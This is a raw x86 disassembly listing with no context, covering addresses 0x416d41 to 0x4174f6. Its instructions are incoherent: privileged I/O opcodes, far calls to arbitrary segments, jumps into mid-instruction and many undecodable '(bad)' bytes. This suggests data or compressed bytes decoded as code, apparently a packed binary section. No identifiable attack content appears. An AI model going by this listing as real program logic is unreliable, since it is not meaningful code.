  416d41:	xor    edi,DWORD PTR [eax]
  416d43:	scas   eax,DWORD PTR es:[edi]
  416d44:	mov    ds:0x53f9604,al
  416d49:	hlt    
  416d4a:	mov    dh,0x13
  416d4c:	sub    eax,0x264b561d
  416d51:	jmp    0x459eeda3
  416d56:	mov    al,0x9e
  416d58:	lahf   
  416d59:	lahf   
  416d5a:	inc    eax
  416d5b:	cdq    
  416d5c:	dec    ebp
  416d5d:	aas    
  416d5e:	add    ebx,DWORD PTR [esi]
  416d60:	sbb    BYTE PTR [edx-0x74],ch
  416d63:	fstp   QWORD PTR [edi+0x7b83c8aa]
  416d69:	jnp    0x416d6f
  416d6b:	lods   eax,DWORD PTR ds:[esi]
  416d6c:	pop    ebx
  416d6d:	sub    ah,BYTE PTR [eax-0x273b1e01]
  416d73:	mov    ss,WORD PTR [ebx-0x7e39489e]
  416d79:	mov    WORD PTR [edi],es
  416d7b:	dec    edi
  416d7c:	adc    edi,DWORD PTR [ebp-0x3e]
  416d7f:	inc    esp
  416d80:	repz js 0x416d3f
  416d83:	inc    eax
  416d84:	xlat   BYTE PTR ds:[ebx]
  416d85:	imul   eax,DWORD PTR [edi+0x52],0x36
  416d89:	or     bl,BYTE PTR [ebx-0x8]
  416d8c:	call   0x5f14:0xae07c41e
  416d93:	out    dx,al
  416d94:	xchg   ecx,eax
  416d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d96:	push   edx
  416d97:	push   edi
  416d98:	outs   dx,DWORD PTR ds:[esi]
  416d99:	sbb    eax,0x9257e00c
  416d9e:	xchg   ecx,eax
  416d9f:	sbb    BYTE PTR [esi],dl
  416da1:	in     al,dx
  416da2:	push   esi
  416da3:	and    BYTE PTR [ebx-0x7be70dec],cl
  416da9:	add    al,0x39
  416dab:	mov    dh,0x6a
  416dad:	mov    esi,0xc734ac7b
  416db2:	xchg   edx,eax
  416db3:	aaa    
  416db4:	xchg   ecx,eax
  416db5:	mov    al,BYTE PTR [esi]
  416db7:	push   ds
  416db8:	push   cs
  416db9:	cmp    BYTE PTR [ecx+0x22],cl
  416dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dbd:	sub    ah,BYTE PTR [ebx-0x6d]
  416dc0:	fimul  WORD PTR [ecx]
  416dc2:	pop    esi
  416dc3:	mov    bh,BYTE PTR [esp+eiz*8+0x47]
  416dc7:	push   edi
  416dc8:	push   ebx
  416dc9:	icebp  
  416dca:	jmp    0x416dd7
  416dcc:	xlat   BYTE PTR ds:[ebx]
  416dcd:	aad    0xbd
  416dcf:	out    0x6e,eax
  416dd1:	les    edi,FWORD PTR [edi-0x22e0457a]
  416dd7:	ja     0x416e07
  416dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dda:	add    eax,0x883b92f7
  416ddf:	push   edx
  416de0:	call   0x5ac5:0x5332dc6e
  416de7:	out    dx,eax
  416de8:	dec    esp
  416de9:	test   eax,0x1a9d3a46
  416dee:	fincstp 
  416df0:	or     edx,ebp
  416df2:	std    
  416df3:	iret   
  416df4:	pop    ebx
  416df5:	push   ds
  416df6:	and    eax,DWORD PTR [edi]
  416df8:	mov    eax,0x8ef359e4
  416dfd:	test   al,0xb0
  416dff:	nop
  416e00:	ja     0x416e16
  416e02:	scas   eax,DWORD PTR es:[edi]
  416e03:	push   ecx
  416e04:	push   0x45
  416e06:	mov    eax,0x874db9b9
  416e0b:	add    al,0x6c
  416e0d:	inc    esp
  416e0e:	fxch   st(4)
  416e10:	push   ds
  416e11:	pop    esp
  416e12:	setae  dl
  416e15:	in     al,0x56
  416e17:	push   0xe0f14944
  416e1c:	push   cs
  416e1d:	fisttp WORD PTR [edx]
  416e1f:	jl     0x416e1a
  416e21:	cmp    al,0x93
  416e23:	sti    
  416e24:	lods   al,BYTE PTR ds:[esi]
  416e25:	xor    dl,BYTE PTR [esi]
  416e27:	icebp  
  416e28:	lahf   
  416e29:	pop    esp
  416e2a:	and    DWORD PTR [edi-0x431da2e4],0x16
  416e31:	movntps XMMWORD PTR ds:[edx+0x5e373066],xmm6
  416e39:	in     eax,0x2e
  416e3b:	retf   
  416e3c:	ret    
  416e3d:	cs (bad) 
  416e3f:	retf   
  416e40:	jmp    0x416eb7
  416e42:	ins    DWORD PTR es:[edi],dx
  416e43:	jecxz  0x416e94
  416e45:	inc    ecx
  416e46:	lods   al,BYTE PTR ds:[esi]
  416e47:	push   ss
  416e48:	add    bl,BYTE PTR [eax+0x74c5bc65]
  416e4e:	mov    WORD PTR [edx-0x52],fs
  416e51:	mov    ds:0x53ee4f17,al
  416e56:	hlt    
  416e57:	push   esi
  416e58:	js     0x416e38
  416e5a:	dec    ecx
  416e5b:	out    0xce,eax
  416e5d:	in     eax,0xbb
  416e5f:	mov    cl,0xca
  416e61:	icebp  
  416e62:	inc    edx
  416e63:	sbb    eax,0xc20201cd
  416e68:	mov    edx,0x6cbb8adf
  416e6d:	mov    bl,0x66
  416e6f:	call   esp
  416e71:	int3   
  416e72:	lock out dx,al
  416e74:	pop    ss
  416e75:	fdiv   DWORD PTR [eax-0x61]
  416e78:	adc    DWORD PTR [esp+edx*4],eax
  416e7b:	ret    0x8c6b
  416e7e:	cmp    BYTE PTR [edx-0x178a1a6a],ah
  416e84:	sub    BYTE PTR [ebp-0x11],dl
  416e87:	stos   DWORD PTR es:[edi],eax
  416e88:	aas    
  416e89:	repz lea edx,[ecx+0x8]
  416e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8e:	push   ds
  416e8f:	or     esp,DWORD PTR [eax+0x65]
  416e92:	cmp    esi,DWORD PTR [ebp+0x20bb5155]
  416e98:	shr    BYTE PTR [eax-0x72],0x69
  416e9c:	cmp    DWORD PTR [ebp+0x30],edi
  416e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ea0:	shl    DWORD PTR [ecx+0x358891ab],1
  416ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ea7:	das    
  416ea8:	pop    ss
  416ea9:	push   esi
  416eaa:	inc    edi
  416eab:	pop    es
  416eac:	fistp  WORD PTR [ecx-0x25344475]
  416eb2:	mov    ecx,DWORD PTR [ecx-0x202ea6d7]
  416eb8:	add    DWORD PTR [edi+0xc],eax
  416ebb:	jae    0x416f38
  416ebd:	loopne 0x416f35
  416ebf:	sub    al,0xb
  416ec1:	cli    
  416ec2:	outs   dx,DWORD PTR ds:[esi]
  416ec3:	xor    eax,0x6ef8fef3
  416ec8:	sar    BYTE PTR [ecx+0x345d15bc],cl
  416ece:	xor    ebp,0x13f443e8
  416ed4:	push   edi
  416ed5:	inc    ebp
  416ed6:	sub    ch,bl
  416ed8:	out    dx,eax
  416ed9:	inc    ebx
  416eda:	pop    ss
  416edb:	in     al,dx
  416edc:	xor    ch,bl
  416ede:	jo     0x416f00
  416ee0:	pop    ds
  416ee1:	js     0x416f21
  416ee3:	fwait
  416ee4:	push   eax
  416ee5:	test   al,0xb6
  416ee7:	adc    DWORD PTR [ecx],ecx
  416ee9:	cli    
  416eea:	pop    edx
  416eeb:	sbb    ch,ch
  416eed:	sub    al,0x3b
  416eef:	loopne 0x416e92
  416ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ef2:	adc    BYTE PTR [esi],cl
  416ef4:	les    ecx,FWORD PTR [ecx]
  416ef6:	mov    dl,BYTE PTR [eax-0x19]
  416ef9:	scas   eax,DWORD PTR es:[edi]
  416efa:	repz push 0x6d
  416efd:	fwait
  416efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eff:	and    eax,0x85a45475
  416f04:	or     DWORD PTR [edx],edx
  416f06:	int    0xc1
  416f08:	scas   al,BYTE PTR es:[edi]
  416f09:	dec    ebx
  416f0a:	loop   0x416eea
  416f0c:	aaa    
  416f0d:	jo     0x416f05
  416f0f:	lods   al,BYTE PTR ds:[esi]
  416f10:	push   0x2c5578c9
  416f15:	ror    DWORD PTR [edx-0x2e],1
  416f18:	rcr    BYTE PTR [ebx+0x4a],0x28
  416f1c:	sub    ebp,DWORD PTR [esi+0x3a]
  416f1f:	mov    dl,bl
  416f21:	and    eax,0x5a57e3c8
  416f26:	popa   
  416f27:	push   0x91e4613
  416f2c:	ja     0x416efb
  416f2e:	(bad)  
  416f2f:	icebp  
  416f30:	scas   eax,DWORD PTR es:[edi]
  416f31:	outs   dx,BYTE PTR ds:[esi]
  416f32:	ret    
  416f33:	stc    
  416f34:	fdivr  st(6),st
  416f36:	int3   
  416f37:	xchg   edi,eax
  416f38:	jmp    0x416ee4
  416f3a:	pop    ecx
  416f3b:	jmp    eax
  416f3d:	sbb    al,0xd4
  416f3f:	popf   
  416f40:	cld    
  416f41:	in     al,0xfc
  416f43:	pop    ebp
  416f44:	lods   eax,DWORD PTR ds:[esi]
  416f45:	arpl   WORD PTR ds:0xa408b968,sp
  416f4b:	lahf   
  416f4c:	out    dx,eax
  416f4d:	stos   BYTE PTR es:[edi],al
  416f4e:	fild   QWORD PTR [ecx+0x460f3a9d]
  416f54:	loope  0x416f1d
  416f56:	out    dx,al
  416f57:	jecxz  0x416fb3
  416f59:	js     0x416fbe
  416f5b:	jle    0x416fca
  416f5d:	dec    eax
  416f5e:	mov    WORD PTR [edx+0xb30cbad],es
  416f64:	(bad)  
  416f65:	cmp    esi,ecx
  416f67:	(bad)  
  416f68:	cmp    DWORD PTR [ecx],0xbf2bbef1
  416f6e:	mov    ch,0x22
  416f70:	xchg   esi,eax
  416f71:	out    0x30,eax
  416f73:	pop    ebp
  416f74:	aad    0x33
  416f76:	cmp    cl,BYTE PTR [edi+0x37]
  416f79:	scas   al,BYTE PTR es:[edi]
  416f7a:	inc    ecx
  416f7b:	fcos   
  416f7e:	inc    edi
  416f7f:	aam    0x43
  416f81:	mov    DWORD PTR [eax],eax
  416f83:	in     eax,0xee
  416f85:	lods   al,BYTE PTR ds:[esi]
  416f86:	fs xor al,0xd0
  416f89:	jmp    0xe3b:0xb051235c
  416f90:	xchg   ebx,eax
  416f91:	xchg   ecx,eax
  416f92:	std    
  416f93:	jecxz  0x416f46
  416f95:	jg     0x416fd2
  416f97:	fs nop
  416f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f9a:	mov    dl,0xd6
  416f9c:	cmp    DWORD PTR [ebx-0x69],ecx
  416f9f:	jns    0x417000
  416fa1:	ret    0x4d4d
  416fa4:	xor    esi,DWORD PTR [eax+0x349ff82e]
  416faa:	jle    0x416f61
  416fac:	mov    ah,ah
  416fae:	mov    cl,0x8
  416fb1:	stos   DWORD PTR es:[edi],eax
  416fb2:	dec    edi
  416fb3:	test   BYTE PTR [edi-0x7c],ch
  416fb6:	push   eax
  416fb7:	mov    ah,0x11
  416fb9:	sub    bl,dh
  416fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fbc:	mov    esi,0x7f7e0c3d
  416fc1:	mov    esp,0x45c423de
  416fc6:	add    edi,ecx
  416fc8:	int    0x31
  416fca:	xor    BYTE PTR ds:0xcd858daa,dl
  416fd0:	cli    
  416fd1:	jns    0x416ff9
  416fd3:	push   es
  416fd4:	sub    cl,BYTE PTR [ebx+0x2a]
  416fd7:	cli    
  416fd8:	imul   edi,DWORD PTR [ebx-0x7f],0xa7697f01
  416fdf:	cmp    ebp,esp
  416fe1:	aas    
  416fe2:	cli    
  416fe3:	jecxz  0x41701b
  416fe5:	mov    ah,0xa6
  416fe7:	adc    eax,edi
  416fe9:	pusha  
  416fea:	ret    
  416feb:	add    ebp,DWORD PTR [ebx+0x8934189]
  416ff1:	push   es
  416ff2:	or     esi,DWORD PTR [eax+0x67f37499]
  416ff8:	out    dx,al
  416ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ffa:	xchg   esi,eax
  416ffb:	pop    edi
  416ffc:	and    al,0xe6
  416ffe:	lods   eax,DWORD PTR ds:[esi]
  416fff:	sbb    al,0x61
  417001:	in     al,0xb6
  417003:	in     eax,dx
  417004:	jmp    0x416fef
  417006:	ja     0x417004
  417008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417009:	dec    ebp
  41700a:	mov    edx,0x6a2913c0
  41700f:	sbb    esi,ebx
  417011:	dec    ebp
  417012:	hlt    
  417013:	(bad)  
  417014:	push   ds
  417015:	call   0x6ca8:0x80637a6b
  41701c:	fxch   st(3)
  41701e:	fsubr  QWORD PTR [esi-0x4f]
  417021:	aam    0x72
  417023:	jns    0x41708c
  417025:	jmp    FWORD PTR [ebx+0x742ea3bf]
  41702b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41702c:	adc    edi,DWORD PTR [esi+0x51619f79]
  417032:	lods   eax,DWORD PTR ds:[esi]
  417033:	adc    DWORD PTR [edx-0x17],esp
  417036:	js     0x416fd1
  417038:	test   eax,0xc85742db
  41703d:	xor    dh,BYTE PTR [ecx-0x1d]
  417040:	sbb    esp,DWORD PTR [edi-0x3e]
  417043:	arpl   WORD PTR [ebx],si
  417045:	in     eax,dx
  417046:	gs cmp eax,0x78d8e78
  41704c:	xchg   BYTE PTR [ebx+0x12],al
  41704f:	mov    ds:0xdc84137d,eax
  417054:	scas   al,BYTE PTR es:[edi]
  417055:	fild   QWORD PTR [eax+0x3f40f0b4]
  41705b:	lea    ebx,[ebx+0x1]
  41705e:	gs jg  0x4170d3
  417061:	adc    ebp,DWORD PTR [esi]
  417063:	sub    DWORD PTR [ebx-0xb59fe49],ebp
  417069:	mov    eax,ds:0x208ab293
  41706e:	ficomp WORD PTR cs:[ebp-0x4106ae6a]
  417075:	add    al,0x49
  417077:	scas   al,BYTE PTR es:[edi]
  417078:	fldcw  WORD PTR [ebx+0x1cba9a8c]
  41707e:	stos   BYTE PTR es:[edi],al
  41707f:	shr    DWORD PTR [esi-0x356ae85b],0x39
  417086:	out    dx,al
  417087:	fs mov edi,0x7b0a95ac
  41708d:	xchg   esi,eax
  41708e:	test   eax,0x29b890f5
  417093:	mov    ecx,0xbb804593
  417098:	scas   al,BYTE PTR es:[edi]
  417099:	pop    eax
  41709a:	pop    edx
  41709b:	cwde   
  41709c:	add    ah,dl
  41709e:	sbb    cl,BYTE PTR [eax]
  4170a0:	in     al,0x24
  4170a2:	jp     0x4170c5
  4170a4:	and    eax,0x70e0415
  4170a9:	pop    esi
  4170aa:	sub    eax,0x12dc6247
  4170af:	mov    esi,0x9570b807
  4170b4:	js     0x417040
  4170b6:	retf   0x9667
  4170b9:	mov    bh,0x62
  4170bb:	shl    DWORD PTR [ebp+0x74],cl
  4170be:	fcomp  DWORD PTR [ebp-0x27b1e7e2]
  4170c4:	mov    edi,0xbc64c223
  4170c9:	fistp  WORD PTR [esi-0x1280125f]
  4170cf:	in     al,0xa6
  4170d1:	mov    cl,0xdb
  4170d3:	call   0x8c10:0xf4174868
  4170da:	mov    ds:0x56fe47e5,al
  4170df:	retf   
  4170e0:	pop    es
  4170e1:	int    0x73
  4170e3:	cmc    
  4170e4:	aam    0xd
  4170e6:	or     al,0x38
  4170e8:	jmp    DWORD PTR [ebx-0x7]
  4170eb:	mov    esp,0xbccb3bd
  4170f0:	scas   al,BYTE PTR es:[edi]
  4170f1:	mov    ecx,0xa13430f
  4170f6:	mov    al,0xe1
  4170f8:	imul   ebp,DWORD PTR [edx-0x5a],0xd9aa477b
  4170ff:	jnp    0x4170d7
  417101:	jl     0xf5421fdf
  417107:	mov    esi,0xc7ef7685
  41710c:	add    al,0x40
  41710e:	mov    al,0xd8
  417110:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  417112:	fwait
  417113:	sbb    DWORD PTR [esi-0x43fd5b6f],ebx
  417119:	jne    0x4170cc
  41711b:	or     ecx,DWORD PTR [edx+eiz*8-0x7b]
  41711f:	pop    ss
  417120:	add    WORD PTR [ebx-0x44b0b691],dx
  417127:	push   esi
  417128:	hlt    
  417129:	lds    ebx,FWORD PTR [ebp+0x2529e6a0]
  41712f:	adc    BYTE PTR [ebx],0xb5
  417132:	imul   edi,DWORD PTR [ecx+0x68],0x29666df8
  417139:	cmp    esp,DWORD PTR [edx]
  41713b:	das    
  41713c:	push   esp
  41713d:	xor    DWORD PTR [esp+edi*2-0x6c4d770d],0xffffffc1
  417145:	lea    edx,[eax+0x7b]
  417148:	shl    DWORD PTR [esi],cl
  41714a:	push   edi
  41714b:	mov    ds:0xc1f0d9b8,eax
  417150:	je     0x417184
  417152:	pushf  
  417153:	sbb    eax,0x610974d9
  417158:	and    DWORD PTR [ebp+eiz*8+0x5d],ecx
  41715c:	rol    DWORD PTR [esi],1
  41715e:	call   0xf2e2:0x162d3b6
  417165:	mov    ch,0xc4
  417167:	pop    esp
  417168:	cmp    al,0x12
  41716a:	data16 cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41716d:	test   DWORD PTR [ecx],ebp
  41716f:	pushf  
  417170:	add    eax,0x4ececd0f
  417175:	or     DWORD PTR [ebp+0x5124e2c3],edi
  41717b:	rcr    BYTE PTR [ebp+0x7438f6ab],cl
  417181:	sub    eax,0xaf94162b
  417186:	xchg   BYTE PTR [edx],al
  417188:	in     eax,0xa2
  41718a:	xor    DWORD PTR [ecx+ebp*4-0x2f09ed17],0xf763db76
  417195:	mov    DWORD PTR [ebx-0x75],ebp
  417198:	add    al,0x1c
  41719a:	mov    bl,0x5d
  41719c:	cmp    al,0xaf
  41719e:	push   es
  41719f:	push   esi
  4171a0:	pop    edx
  4171a1:	sub    DWORD PTR [edx-0x62],ebp
  4171a4:	push   eax
  4171a5:	jnp    0x4171f1
  4171a7:	mov    ebx,DWORD PTR [ebp-0x1d]
  4171aa:	daa    
  4171ab:	data16 mov dh,0xa4
  4171ae:	call   0x1034:0xa5904679
  4171b5:	stos   DWORD PTR es:[edi],eax
  4171b6:	fistp  QWORD PTR [edi+0x7fcb282d]
  4171bc:	fidivr WORD PTR gs:[ebp+0x7ce50a9]
  4171c3:	stos   DWORD PTR es:[edi],eax
  4171c4:	add    bl,BYTE PTR [ebp-0x33]
  4171c7:	jae    0x417214
  4171c9:	jae    0x4171d8
  4171cb:	jne    0x4171d1
  4171cd:	adc    DWORD PTR [eax-0x14],esi
  4171d0:	(bad)  
  4171d1:	mov    ds:0x992aae79,al
  4171d6:	sub    al,0x3b
  4171d8:	in     eax,dx
  4171d9:	(bad)  
  4171da:	adc    ch,bl
  4171dc:	add    DWORD PTR [ebx+0x168e76a9],ebp
  4171e2:	or     DWORD PTR [esi],edi
  4171e4:	sbb    edi,ecx
  4171e6:	jl     0x417263
  4171e8:	add    cl,ch
  4171ea:	mov    ebp,0x423fffb4
  4171ef:	ret    
  4171f0:	icebp  
  4171f1:	jmp    0x1e64b5ad
  4171f6:	adc    BYTE PTR [edx+0x69dba5b5],dh
  4171fc:	mov    ebp,0x7a09433d
  417201:	sbb    al,0x19
  417203:	push   edx
  417204:	das    
  417205:	push   ecx
  417206:	test   eax,0x29360bc9
  41720b:	mov    edi,0xd2d93be9
  417210:	in     eax,0x1e
  417212:	ss in  eax,0xf0
  417215:	add    BYTE PTR [eax],al
  417217:	xor    eax,0x3637a488
  41721c:	shl    BYTE PTR [ecx+0x109c02e8],0x49
  417223:	xchg   DWORD PTR [esi+0x7c],edx
  417226:	sbb    BYTE PTR ds:0xf38e27c1,0x56
  41722d:	test   DWORD PTR [ecx+0x6b],0xae12e58c
  417234:	ret    
  417235:	lahf   
  417236:	adc    bh,ch
  417238:	jge    0x417220
  41723a:	pop    ebp
  41723b:	adc    DWORD PTR [edx],eax
  41723d:	cmp    ch,BYTE PTR [eax]
  41723f:	cmp    al,0x9d
  417241:	xor    BYTE PTR [ebx+0x31de9385],al
  417247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417249:	jno    0x417252
  41724b:	or     eax,0xc06f5657
  417250:	mov    eax,0xd4b687ec
  417255:	not    DWORD PTR [ebx]
  417257:	stos   DWORD PTR es:[edi],eax
  417258:	xchg   edi,eax
  417259:	fdivr  QWORD PTR [edi+0x65]
  41725c:	inc    esp
  41725d:	and    DWORD PTR [edx+0x32],esp
  417260:	adc    ah,BYTE PTR [ebp+0x37]
  417263:	inc    edi
  417264:	lock test al,0xbc
  417267:	jmp    0xeffb:0xc7fcd58b
  41726e:	pop    ebp
  41726f:	sbb    eax,0x75453965
  417274:	pop    edi
  417275:	scas   al,BYTE PTR es:[edi]
  417276:	ds iret 
  417278:	sahf   
  417279:	ins    BYTE PTR es:[edi],dx
  41727a:	or     DWORD PTR [ebx+0x59581c95],eax
  417280:	push   ds
  417281:	pop    eax
  417282:	fst    DWORD PTR cs:[esi]
  417285:	test   eax,0xcc697d8b
  41728a:	ror    DWORD PTR [eax],cl
  41728c:	fcomp  DWORD PTR [ebx-0x5f]
  41728f:	xor    dl,0x95
  417292:	fldcw  WORD PTR [ebp-0x3b]
  417295:	xchg   edx,eax
  417296:	out    0x64,eax
  417298:	and    DWORD PTR [ebx+0xc3ad5cc],ecx
  41729e:	mov    ecx,0x4613b0d
  4172a3:	stos   DWORD PTR es:[edi],eax
  4172a4:	mov    ds:0xf1063bbf,al
  4172a9:	das    
  4172aa:	test   eax,0x8c461ce8
  4172af:	retf   
  4172b0:	icebp  
  4172b1:	and    BYTE PTR [edi+0x20],cl
  4172b4:	push   ds
  4172b5:	inc    eax
  4172b6:	add    eax,0x68a28625
  4172bb:	sub    bh,BYTE PTR [edi-0x16]
  4172be:	inc    ax
  4172c0:	daa    
  4172c1:	sbb    eax,0xf4f5d831
  4172c6:	sub    DWORD PTR [esi-0xf03844c],0xffffffc4
  4172cd:	repz push ds
  4172cf:	leave  
  4172d0:	fucomi st,st(5)
  4172d2:	mov    bl,0xb0
  4172d4:	mov    eax,0xd9e30418
  4172d9:	retf   0xebf1
  4172dc:	jp     0x41728c
  4172de:	add    edi,esi
  4172e0:	int3   
  4172e1:	stos   DWORD PTR es:[edi],eax
  4172e2:	mov    cl,0xe6
  4172e4:	push   ebp
  4172e5:	fmul   DWORD PTR [ebx]
  4172e7:	xor    eax,0x3635a99c
  4172ec:	aad    0x9e
  4172ee:	mov    esp,0xa8c9bc00
  4172f3:	gs enter 0xce7d,0x3
  4172f8:	(bad)  
  4172f9:	sub    BYTE PTR [eax+0x12],bh
  4172fc:	aas    
  4172fd:	aam    0xba
  4172ff:	cmp    BYTE PTR [edx],al
  417301:	sbb    BYTE PTR ds:0xad302164,ch
  417307:	mov    edx,0x1bb382c5
  41730c:	popa   
  41730d:	test   edx,esi
  41730f:	shl    dh,cl
  417311:	inc    eax
  417312:	inc    ecx
  417313:	sti    
  417314:	jp     0x41730f
  417316:	ss adc eax,0x4fd3fa8f
  41731c:	stos   DWORD PTR es:[edi],eax
  41731d:	push   ds
  41731e:	mov    eax,ds:0xe476b56f
  417323:	push   cs
  417324:	ins    BYTE PTR es:[edi],dx
  417325:	adc    dh,BYTE PTR [esi]
  417327:	aam    0x1b
  417329:	and    bl,ah
  41732b:	bound  esi,QWORD PTR [ebx+0x25]
  41732e:	into   
  41732f:	(bad)  
  417330:	es ss mov cl,0x2f
  417334:	out    0x2,eax
  417336:	cmc    
  417337:	in     eax,dx
  417338:	inc    eax
  417339:	test   dl,0x93
  41733c:	xchg   ebx,eax
  41733d:	aaa    
  41733e:	rol    BYTE PTR [ecx+edx*2+0x6a],cl
  417342:	or     DWORD PTR [ebx+eax*1+0x6cab7983],ecx
  417349:	dec    edx
  41734a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41734b:	ds mov dl,0xd8
  41734e:	add    DWORD PTR [ebp+0xca1c9c7],edi
  417354:	mov    eax,ds:0x6745bec3
  417359:	or     DWORD PTR [esi],eax
  41735b:	pushf  
  41735c:	and    DWORD PTR [eax],ebx
  41735e:	scas   eax,DWORD PTR es:[edi]
  41735f:	pcmpeqw mm7,QWORD PTR [ebx+0x70]
  417363:	les    edi,FWORD PTR [ebx-0x7956f31]
  417369:	int3   
  41736a:	rol    ch,0xb4
  41736d:	in     eax,dx
  41736e:	xlat   BYTE PTR ds:[ebx]
  41736f:	pop    esp
  417370:	shr    DWORD PTR [edi-0x27],cl
  417373:	add    edi,DWORD PTR [eax]
  417375:	cdq    
  417376:	(bad)  
  417377:	loop   0x4173aa
  417379:	fmul   st(7),st
  41737b:	inc    eax
  41737c:	adc    esi,esi
  41737e:	fwait
  41737f:	int    0x8a
  417381:	and    ebp,DWORD PTR [ecx]
  417383:	add    ecx,DWORD PTR [esp+esi*2-0x31]
  417387:	aad    0x38
  417389:	fstp   TBYTE PTR [ecx]
  41738b:	arpl   WORD PTR [edx+0x1c],bp
  41738e:	xor    BYTE PTR [ebp-0x289f2c6b],0x71
  417395:	cmp    cl,cl
  417397:	jae    0x4173c1
  417399:	call   0x1b95e18f
  41739e:	lods   al,BYTE PTR ds:[esi]
  41739f:	cld    
  4173a0:	je     0x417360
  4173a2:	call   0x534a:0x7511ba00
  4173a9:	push   eax
  4173aa:	fadd   QWORD PTR [ebp-0x6faa5082]
  4173b0:	sbb    DWORD PTR [esi+0xb],ebp
  4173b3:	ins    DWORD PTR es:[edi],dx
  4173b4:	aad    0x58
  4173b6:	mov    cl,0x28
  4173b8:	xor    BYTE PTR [edi],bh
  4173ba:	fstp   QWORD PTR [ecx+eax*1]
  4173bd:	nop
  4173be:	imul   eax,edi,0x191ab214
  4173c4:	jne    0x417349
  4173c6:	cs xchg ecx,eax
  4173c8:	daa    
  4173c9:	sti    
  4173ca:	xchg   edi,eax
  4173cb:	retf   
  4173cc:	jl     0x41741c
  4173ce:	or     bh,0x40
  4173d1:	fwait
  4173d2:	test   eax,0x7c12cd6a
  4173d7:	push   ss
  4173d8:	pop    ecx
  4173d9:	(bad)
  4173dd:	cli    
  4173de:	push   esp
  4173df:	repnz cmp al,0x77
  4173e2:	outs   dx,BYTE PTR ds:[esi]
  4173e3:	adc    eax,0x21649333
  4173e8:	cli    
  4173e9:	mov    ecx,DWORD PTR [ecx+0x43ae6165]
  4173ef:	jecxz  0x41746d
  4173f1:	push   0xffffffff
  4173f3:	out    0xeb,al
  4173f5:	lahf   
  4173f6:	cmp    ch,BYTE PTR [esi+0x8]
  4173f9:	push   esp
  4173fa:	cmp    al,0x94
  4173fc:	loope  0x4173c0
  4173fe:	pushf  
  4173ff:	mov    ds:0x27410101,al
  417404:	fcomp  QWORD PTR [esp+ebx*2-0x65]
  417408:	dec    edi
  417409:	dec    esp
  41740a:	(bad)  
  41740b:	enter  0x277,0x1f
  41740f:	(bad)  
  417410:	int3   
  417411:	pop    ebx
  417412:	ins    DWORD PTR es:[edi],dx
  417413:	add    ecx,0x98c21258
  417419:	das    
  41741a:	cld    
  41741b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41741c:	adc    DWORD PTR [esi-0x1c6bd693],eax
  417422:	mov    ecx,0xbce48bdf
  417427:	sub    DWORD PTR [ebx-0x73],0xfffffff9
  41742b:	pop    ebp
  41742c:	in     eax,0xb0
  41742e:	and    cl,BYTE PTR [ecx]
  417430:	add    al,0x43
  417432:	imul   ebp,DWORD PTR [edx+0x278b4272],0x2b
  417439:	mov    BYTE PTR [esi-0x54],dh
  41743c:	in     eax,0x32
  41743e:	push   ebx
  41743f:	sub    al,0x32
  417441:	inc    edi
  417442:	nop
  417443:	push   ecx
  417444:	mov    dl,0xb9
  417446:	mov    ebp,0x65e67fb1
  41744b:	gs je  0x4173e7
  41744e:	cmp    eax,0xc2a25c6b
  417453:	pop    eax
  417454:	mov    ebp,0xebe18b3
  417459:	jne    0x41746b
  41745b:	gs dec edi
  41745d:	push   0xffffff86
  41745f:	pop    edi
  417460:	popa   
  417461:	xchg   ebx,eax
  417462:	mov    eax,ds:0xa6950fd5
  417467:	jnp    0x4174d0
  417469:	jo     0x4174ca
  41746b:	daa    
  41746c:	pop    edi
  41746d:	stos   BYTE PTR es:[edi],al
  41746e:	test   eax,0x6ef2bf1d
  417473:	(bad)  
  417475:	dec    DWORD PTR [ebx+0x5ea6d7ae]
  41747b:	mov    esi,0x7c6887b6
  417480:	arpl   WORD PTR [eax+0x4d193148],cx
  417486:	dec    ebx
  417487:	ret    
  417488:	into   
  417489:	adc    BYTE PTR [edi+0x6a2f95cf],cl
  41748f:	mov    DWORD PTR fs:[esi],esi
  417492:	call   0xd571e9c7
  417497:	mov    edx,0x91f79761
  41749c:	js     0x417454
  41749e:	std    
  41749f:	and    eax,DWORD PTR [eax-0x2c]
  4174a2:	arpl   WORD PTR [ebx-0x47ec8dc1],cx
  4174a8:	aad    0xad
  4174aa:	sbb    eax,0xd4733292
  4174af:	sub    al,0xcf
  4174b1:	mov    esp,0x945d8810
  4174b6:	outs   dx,BYTE PTR ds:[esi]
  4174b7:	cwde   
  4174b8:	test   eax,0x55551af1
  4174bd:	xor    al,0x11
  4174bf:	out    dx,al
  4174c0:	and    DWORD PTR [edx],edx
  4174c2:	inc    eax
  4174c3:	adc    DWORD PTR [eax-0x739b6679],ebx
  4174c9:	iret   
  4174ca:	int3   
  4174cb:	xchg   esp,eax
  4174cc:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4174ce:	mov    dl,BYTE PTR [edx-0x6042cf09]
  4174d4:	repz arpl WORD PTR [edi-0x53e6e172],di
  4174db:	mov    esi,0x24fb63ce
  4174e0:	pushf  
  4174e1:	ret    0x86a6
  4174e4:	sub    DWORD PTR [ebp-0x5c],esp
  4174e7:	mov    bh,0xe3
  4174e9:	idiv   DWORD PTR [eax+0x1a]
  4174ec:	pop    ss
  4174ed:	mov    ch,0xab
  4174ef:	std    
  4174f0:	mov    ebx,0x34181821
  4174f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f6:	and    eax,0x76fcfcdd
